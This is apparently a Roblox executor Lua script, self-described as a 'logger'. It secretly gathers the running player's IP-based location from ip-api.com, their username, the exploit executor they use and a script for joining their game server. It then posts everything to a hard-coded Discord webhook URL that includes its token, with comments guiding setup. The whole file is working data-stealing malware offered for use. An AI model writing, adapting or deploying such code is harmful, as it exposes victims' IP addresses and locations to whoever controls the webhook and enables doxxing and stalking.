local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(helo) --line above generates a script that allows u to join the logged user

--checks executor
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/1394003704746741781/sCHgs18dUx_faqRL7KJZkmngr97mY3wGnuXCDxktZwc0xa2ifOC90cp7P5MqMtercJvH" --pretty obvious what to do here
local data = {
            ["username"] = "Salmon-L0G", --webhook name thing idk
            ["avatar_url"] = "https://cdn.discordapp.com/attachments/1391033797738365050/1398165474549956639/IMG_7353.png?ex=68850751&is=6883b5d1&hm=2eb061a35298cd7b8de7813690d66f36073e8c000175c6e48bbfaca6ec67f6b8&", --avatar image url
    
    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
    ["embeds"] = {
       {
           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
           ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
           ["color"] = 14680319,
           ["footer"] = {
             ["text"] = "" ..join_script.. "", --sends join script
           },
       },
   }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef) --post, idk
